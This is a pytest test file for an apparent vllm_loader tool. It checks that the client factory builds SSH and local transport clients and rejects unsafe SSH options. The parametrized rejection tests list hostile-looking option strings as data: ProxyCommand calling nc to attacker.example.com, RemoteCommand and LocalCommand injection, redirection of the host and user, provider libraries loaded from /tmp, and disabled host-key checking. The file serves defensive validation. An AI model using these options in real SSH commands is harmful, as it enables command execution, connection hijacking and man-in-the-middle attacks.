from __future__ import annotations

from pathlib import Path

import pytest

from vllm_loader.config.targets import TargetConfig, TransportKind
from vllm_loader.transport.client import event_matches_subscription
from vllm_loader.transport.inprocess import InProcessTargetClient
from vllm_loader.transport.socket import UnixSocketTargetClient
from vllm_loader.transport.subprocess import SubprocessTargetClient


def _target_client_for_config():
    try:
        from vllm_loader.transport.factory import target_client_for_config
    except ModuleNotFoundError as exc:
        pytest.fail(f"target client factory missing: {exc}")
    return target_client_for_config


def test_subscription_event_matcher_accepts_job_ids() -> None:
    assert event_matches_subscription(
        {"event": "job_progress", "job_id": "job-1"},
        {"job-1"},
    )
    assert not event_matches_subscription(
        {"event": "job_progress", "job_id": "job-1"},
        {"run-1"},
    )


def test_subscription_event_matcher_broadcasts_agent_errors() -> None:
    assert event_matches_subscription(
        {"event": "agent_error", "detail": "malformed frame", "fatal": False},
        {"run-1"},
    )


def test_target_client_factory_builds_implicit_local_socket_client() -> None:
    client = _target_client_for_config()(TargetConfig(name="local"))

    assert isinstance(client, UnixSocketTargetClient)


@pytest.mark.asyncio
async def test_target_client_factory_builds_explicit_local_in_process_client() -> None:
    client = _target_client_for_config()(
        TargetConfig(name="local", local_transport="in_process")
    )

    assert isinstance(client, InProcessTargetClient)
    await client.connect()
    try:
        handshake = await client.call("handshake")
    finally:
        await client.disconnect()

    assert handshake["target"] == "local"


def test_target_client_factory_builds_explicit_local_socket_client(
    tmp_path: Path,
) -> None:
    socket_path = tmp_path / "agent.sock"
    target = TargetConfig(
        name="local-socket",
        local_transport="socket",
        socket_path=socket_path,
    )

    client = _target_client_for_config()(target)

    assert isinstance(client, UnixSocketTargetClient)
    assert client._socket_path == socket_path


def test_target_client_factory_builds_ssh_subprocess_client(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("VLLM_LOADER_SSH_OPTS", "-i /tmp/gpu-key -o ProxyJump=bastion")
    target = TargetConfig(
        name="blackbird",
        transport=TransportKind.SSH,
        host="bgconley@10.25.0.51",
        workdir=Path("/tank/repos/lab-tui"),
        venv=Path("/tank/venvs/lab-tui"),
        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
    )

    client = _target_client_for_config()(target)

    assert isinstance(client, SubprocessTargetClient)
    assert client._command == [
        "ssh",
        "-i",
        "/tmp/gpu-key",
        "-o",
        "ProxyJump=bastion",
        "-o",
        "BatchMode=yes",
        "-o",
        "ServerAliveInterval=15",
        "-o",
        "ServerAliveCountMax=3",
        "-o",
        "ControlMaster=auto",
        "-o",
        "ControlPersist=60s",
        "-o",
        "ControlPath=~/.ssh/vllm-loader-%C",
        "bgconley@10.25.0.51",
        "cd /tank/repos/lab-tui && PATH=/tank/venvs/lab-tui/bin:$PATH vllm-loader agent connect",
    ]


def test_target_client_factory_rejects_positional_ssh_opts(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("VLLM_LOADER_SSH_OPTS", "-i /tmp/gpu-key evil.example.com")
    target = TargetConfig(
        name="blackbird",
        transport=TransportKind.SSH,
        host="bgconley@10.25.0.51",
        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
    )

    with pytest.raises(ValueError, match="positional SSH argument"):
        _target_client_for_config()(target)


@pytest.mark.parametrize(
    "ssh_opts",
    [
        "-o ProxyCommand='nc attacker.example.com 22'",
        "-oProxyCommand='nc attacker.example.com 22'",
        "-o RemoteCommand=whoami",
        "-o PermitLocalCommand=yes -o LocalCommand='touch /tmp/vllm-loader-owned'",
    ],
)
def test_target_client_factory_rejects_command_bearing_ssh_options(
    monkeypatch: pytest.MonkeyPatch,
    ssh_opts: str,
) -> None:
    monkeypatch.setenv("VLLM_LOADER_SSH_OPTS", ssh_opts)
    target = TargetConfig(
        name="blackbird",
        transport=TransportKind.SSH,
        host="bgconley@10.25.0.51",
        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
    )

    with pytest.raises(ValueError, match="command-bearing SSH option"):
        _target_client_for_config()(target)


@pytest.mark.parametrize(
    "ssh_opts",
    [
        "-F /tmp/ssh_config",
        "-F/tmp/ssh_config",
        "-S /tmp/control-socket",
        "-S/tmp/control-socket",
        "-o ControlPath=/tmp/control-socket",
        "-oControlPath=/tmp/control-socket",
    ],
)
def test_target_client_factory_rejects_opaque_ssh_routing_options(
    monkeypatch: pytest.MonkeyPatch,
    ssh_opts: str,
) -> None:
    monkeypatch.setenv("VLLM_LOADER_SSH_OPTS", ssh_opts)
    target = TargetConfig(
        name="blackbird",
        transport=TransportKind.SSH,
        host="bgconley@10.25.0.51",
        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
    )

    with pytest.raises(ValueError, match="routing SSH option"):
        _target_client_for_config()(target)


@pytest.mark.parametrize(
    "ssh_opts",
    [
        "-l mallory",
        "-lmallory",
        "-o User=mallory",
        "-oUser=mallory",
        "-o HostName=attacker.example.com",
        "-oHostName=attacker.example.com",
    ],
)
def test_target_client_factory_rejects_target_identity_ssh_overrides(
    monkeypatch: pytest.MonkeyPatch,
    ssh_opts: str,
) -> None:
    monkeypatch.setenv("VLLM_LOADER_SSH_OPTS", ssh_opts)
    target = TargetConfig(
        name="blackbird",
        transport=TransportKind.SSH,
        host="bgconley@10.25.0.51",
        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
    )

    with pytest.raises(ValueError, match="target identity SSH option"):
        _target_client_for_config()(target)


@pytest.mark.parametrize(
    "ssh_opts",
    [
        "-o Include=/tmp/ssh_config",
        "-oInclude=/tmp/ssh_config",
    ],
)
def test_target_client_factory_rejects_included_ssh_config_options(
    monkeypatch: pytest.MonkeyPatch,
    ssh_opts: str,
) -> None:
    monkeypatch.setenv("VLLM_LOADER_SSH_OPTS", ssh_opts)
    target = TargetConfig(
        name="blackbird",
        transport=TransportKind.SSH,
        host="bgconley@10.25.0.51",
        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
    )

    with pytest.raises(ValueError, match="routing SSH option"):
        _target_client_for_config()(target)


@pytest.mark.parametrize(
    "ssh_opts",
    [
        "-I /tmp/pkcs11-provider.so",
        "-I/tmp/pkcs11-provider.so",
        "-o PKCS11Provider=/tmp/pkcs11-provider.so",
        "-oPKCS11Provider=/tmp/pkcs11-provider.so",
        "-o SecurityKeyProvider=/tmp/security-key-provider",
        "-oSecurityKeyProvider=/tmp/security-key-provider",
    ],
)
def test_target_client_factory_rejects_provider_loading_ssh_options(
    monkeypatch: pytest.MonkeyPatch,
    ssh_opts: str,
) -> None:
    monkeypatch.setenv("VLLM_LOADER_SSH_OPTS", ssh_opts)
    target = TargetConfig(
        name="blackbird",
        transport=TransportKind.SSH,
        host="bgconley@10.25.0.51",
        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
    )

    with pytest.raises(ValueError, match="provider-loading SSH option"):
        _target_client_for_config()(target)


@pytest.mark.parametrize(
    "ssh_opts",
    [
        "-o StrictHostKeyChecking=no",
        "-oStrictHostKeyChecking=off",
        "-o CheckHostIP=no",
        "-oCheckHostIP=false",
        "-o UserKnownHostsFile=/dev/null",
        "-oUserKnownHostsFile=none",
        "-o GlobalKnownHostsFile=/dev/null",
        "-oGlobalKnownHostsFile=none",
        "-o HostKeyAlgorithms=+ssh-rsa",
        "-oHostKeyAlgorithms=ssh-rsa",
        "-o KnownHostsCommand=/tmp/known-hosts",
        "-oKnownHostsCommand=/tmp/known-hosts",
    ],
)
def test_target_client_factory_rejects_host_verification_weakening_ssh_options(
    monkeypatch: pytest.MonkeyPatch,
    ssh_opts: str,
) -> None:
    monkeypatch.setenv("VLLM_LOADER_SSH_OPTS", ssh_opts)
    target = TargetConfig(
        name="blackbird",
        transport=TransportKind.SSH,
        host="bgconley@10.25.0.51",
        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
    )

    with pytest.raises(ValueError, match="host verification SSH option"):
        _target_client_for_config()(target)


def test_target_client_factory_accepts_concatenated_safe_ssh_opts(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv(
        "VLLM_LOADER_SSH_OPTS",
        "-A -i/tmp/gpu-key -Jbastion -p2222 -oStrictHostKeyChecking=yes",
    )
    target = TargetConfig(
        name="blackbird",
        transport=TransportKind.SSH,
        host="bgconley@10.25.0.51",
        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
    )

    client = _target_client_for_config()(target)

    assert isinstance(client, SubprocessTargetClient)
    assert client._command[1:6] == [
        "-A",
        "-i/tmp/gpu-key",
        "-Jbastion",
        "-p2222",
        "-oStrictHostKeyChecking=yes",
    ]


@pytest.mark.parametrize(
    "ssh_opts",
    [
        "-o BatchMode=no",
        "-oBatchMode=no",
        "-o ServerAliveInterval=1",
        "-oServerAliveInterval=1",
        "-o ServerAliveCountMax=0",
        "-oServerAliveCountMax=0",
    ],
)
def test_target_client_factory_rejects_required_ssh_option_overrides(
    monkeypatch: pytest.MonkeyPatch,
    ssh_opts: str,
) -> None:
    monkeypatch.setenv("VLLM_LOADER_SSH_OPTS", ssh_opts)
    target = TargetConfig(
        name="blackbird",
        transport=TransportKind.SSH,
        host="bgconley@10.25.0.51",
        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
    )

    with pytest.raises(ValueError, match="required SSH option"):
        _target_client_for_config()(target)
